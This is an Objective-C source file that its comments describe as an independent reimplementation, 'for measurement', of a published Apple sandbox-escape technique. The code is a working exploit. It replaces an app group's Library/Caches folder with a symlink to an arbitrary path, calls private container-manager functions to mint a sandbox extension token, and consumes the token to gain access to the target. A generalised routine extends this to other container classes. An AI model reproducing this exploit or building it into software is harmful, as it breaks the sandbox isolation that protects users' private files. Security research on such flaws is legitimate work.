//
//  WQProbe.c
//  Bench27
//
//  Independent implementation of the container-manager extension path, written
//  for measurement. The sequence is the one published as worse_query by
//  Taj C (forcequit); the code here is ours.
//
//  Why it can work: the extension token is minted for the group's
//  Library/Caches path, and that path is a symlink we control. The token is
//  issued before the link is resolved, so the grant lands on the target.
//

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <xpc/xpc.h>

typedef void *(*wq_query_create)(void);
typedef void (*wq_query_set_class)(void *, uint64_t);
typedef void (*wq_query_set_groups)(void *, xpc_object_t);
typedef void (*wq_query_set_flags)(void *, uint64_t);
typedef void (*wq_query_set_part)(void *, uint64_t);
typedef void *(*wq_query_result)(void *);
typedef void (*wq_query_free)(void *);
typedef char *(*wq_copy_token)(void *);
typedef int64_t (*wq_consume)(const char *);
typedef int (*wq_release)(int64_t);

static void wq_restore_caches(NSString *group)
{
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!root) return;
    NSURL *caches = [root URLByAppendingPathComponent:@"Library/Caches"];
    [fm removeItemAtURL:caches error:nil];
    [fm createDirectoryAtURL:caches withIntermediateDirectories:NO attributes:nil error:nil];
}

/// Returns the sandbox extension handle, or a negative step number.
int64_t wq_grant(const char *target, const char *group, uint64_t flags)
{
    struct stat st;
    if (lstat(target, &st) != 0) return -255;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:
                   [NSString stringWithUTF8String:group]];
    if (!root) return -1;

    NSString *caches = [[root URLByAppendingPathComponent:@"Library/Caches"] path];

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                       RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2;

    wq_query_create qc = (wq_query_create)dlsym(mgr, "container_query_create");
    wq_query_set_class qk = (wq_query_set_class)dlsym(mgr, "container_query_set_class");
    wq_query_set_groups qg = (wq_query_set_groups)dlsym(mgr, "container_query_set_group_identifiers");
    wq_query_set_flags qf = (wq_query_set_flags)dlsym(mgr, "container_query_operation_set_flags");
    wq_query_set_part qp = (wq_query_set_part)dlsym(mgr, "container_query_operation_set_part");
    wq_query_result qr = (wq_query_result)dlsym(mgr, "container_query_get_single_result");
    wq_query_free qfree = (wq_query_free)dlsym(mgr, "container_query_free");
    wq_copy_token qt = (wq_copy_token)dlsym(mgr, "container_copy_sandbox_token");
    wq_consume consume = (wq_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!qc || !qk || !qg || !qf || !qp || !qr || !qfree || !qt || !consume) {
        dlclose(mgr);
        return -2;
    }

    void *query = qc();
    if (!query) { dlclose(mgr); return -3; }

    xpc_object_t ids = xpc_string_create(group);
    qk(query, 7);
    qg(query, ids);
    qp(query, 3);
    qf(query, flags);

    [fm removeItemAtPath:caches error:nil];
    if (![fm createSymbolicLinkAtPath:caches
                     withDestinationPath:[NSString stringWithUTF8String:target]
                                   error:nil]) {
        dlclose(mgr);
        return -4;
    }

    void *result = qr(query);
    if (!result) {
        qfree(query);
        dlclose(mgr);
        wq_restore_caches([NSString stringWithUTF8String:group]);
        return -5;
    }

    char *token = qt(result);
    if (!token) {
        qfree(query);
        dlclose(mgr);
        wq_restore_caches([NSString stringWithUTF8String:group]);
        return -6;
    }

    int64_t handle = consume(token);
    qfree(query);
    free(token);
    dlclose(mgr);
    wq_restore_caches([NSString stringWithUTF8String:group]);
    return handle;
}

void wq_revoke(int64_t handle)
{
    if (handle < 0) return;
    wq_release fn = (wq_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (fn) fn(handle);
}

/// True when the app group container exists and is ours.
int wq_group_available(const char *group)
{
    NSURL *root = [[NSFileManager defaultManager]
                   containerURLForSecurityApplicationGroupIdentifier:
                   [NSString stringWithUTF8String:group]];
    return root != nil;
}

typedef void (*wq_query_set_part_domain)(void *, xpc_object_t);

/// Generic query: returns the consumed extension handle, or a negative step.
/// class 7 is the app-group path we already use; class 2 is the app container,
/// class 13 the legacy traversal, class 12 a built-in container.
int64_t wq_token(const char *identifier, uint64_t cls, uint64_t part,
                 uint64_t flags, const char *partDomain)
{
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                       RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2;

    wq_query_create qc = (wq_query_create)dlsym(mgr, "container_query_create");
    wq_query_set_class qk = (wq_query_set_class)dlsym(mgr, "container_query_set_class");
    wq_query_set_groups qg = (wq_query_set_groups)dlsym(mgr, "container_query_set_group_identifiers");
    wq_query_set_flags qf = (wq_query_set_flags)dlsym(mgr, "container_query_operation_set_flags");
    wq_query_set_part qp = (wq_query_set_part)dlsym(mgr, "container_query_operation_set_part");
    wq_query_result qr = (wq_query_result)dlsym(mgr, "container_query_get_single_result");
    wq_query_free qfree = (wq_query_free)dlsym(mgr, "container_query_free");
    wq_copy_token qt = (wq_copy_token)dlsym(mgr, "container_copy_sandbox_token");
    wq_consume consume = (wq_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    wq_query_set_part_domain qd =
        (wq_query_set_part_domain)dlsym(mgr, "container_query_operation_set_part_domain");
    if (!qc || !qk || !qg || !qf || !qp || !qr || !qfree || !qt || !consume) {
        dlclose(mgr);
        return -2;
    }

    void *query = qc();
    if (!query) { dlclose(mgr); return -3; }

    xpc_object_t ids = xpc_string_create(identifier);
    qk(query, cls);
    qg(query, ids);
    qp(query, part);
    qf(query, flags);
    if (partDomain && partDomain[0] && qd) {
        xpc_object_t dom = xpc_string_create(partDomain);
        qd(query, dom);
    }

    void *result = qr(query);
    if (!result) { qfree(query); dlclose(mgr); return -5; }

    char *token = qt(result);
    if (!token) { qfree(query); dlclose(mgr); return -6; }

    int64_t handle = consume(token);
    qfree(query);
    free(token);
    dlclose(mgr);
    return handle;
}

